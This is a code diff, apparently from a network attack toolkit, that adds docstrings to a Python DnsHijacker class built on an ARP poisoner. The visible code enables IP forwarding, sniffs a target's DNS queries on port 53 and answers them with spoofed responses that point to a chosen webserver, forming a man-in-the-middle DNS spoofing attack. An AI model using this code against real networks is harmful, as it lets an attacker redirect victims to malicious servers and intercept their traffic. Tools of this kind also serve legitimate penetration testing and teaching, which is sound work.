@@ -8,13 +8,36 @@ from .arp import ArpPoisoner
 
 
 class DnsHijacker(ArpPoisoner):
+	"""
+	Parameters
+	----------
+	target : str
+		The target's hostname or IP address
+	webserver_ipv4 : str
+		The IP addresses of the webserver as answer to DNS queries
+
+	Methods
+	-------
+	start()
+		Sends spoofed DNS responses to target with the answer
+		pointing to self.webserver_ipv4
+	"""
+
 	def __init__(self, target, webserver_ipv4):
+		"""
+		Parameters
+		----------
+		target : str
+			The target's hostname or IP address
+		webserver_ipv4 : str
+			The IP addresses of the webserver as answer to DNS queries
+		"""
 		super().__init__(target)
 		self.webserver_ipv4 = webserver_ipv4
 
 	@staticmethod
 	def setup_config():
-		"""Enable IPv4 forwarding and Disables DNS Query forwarding"""
+		"""Enables IPv4 forwarding and disables DNS Query forwarding"""
 
 		# Enable IPv4 forwarding
 		ArpPoisoner.setup_config()
@@ -28,9 +51,11 @@ class DnsHijacker(ArpPoisoner):
 			print("[*] Please ensure DNS forwarding is disabled")
 
 	def dns_sniffer(self):
+		"""Sniff for DNS requests and pass them to dns_spoofer"""
 		sniff(filter="udp and port 53 and host " + self.target_ipv4, prn=DnsHijacker.dns_spoofer)
 
 	def dns_spoofer(self, pkt):
+		"""Send spoofed DNS responses to the target"""
 		if (pkt[IP].src == self.target_ipv4 and
 			pkt.haslayer(DNS) and
 			pkt[DNS].qr == 0 and				# DNS Query
@@ -72,6 +97,9 @@ class DnsHijacker(ArpPoisoner):
 			#print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {self.webserver_ipv4}")
 
 	def start(self):
+		"""
+		Poison the target's ARP cache and send spoofed DNS responses
+		"""
 		DnsHijacker.setup_config()
 
 		# Create ARP poisoner
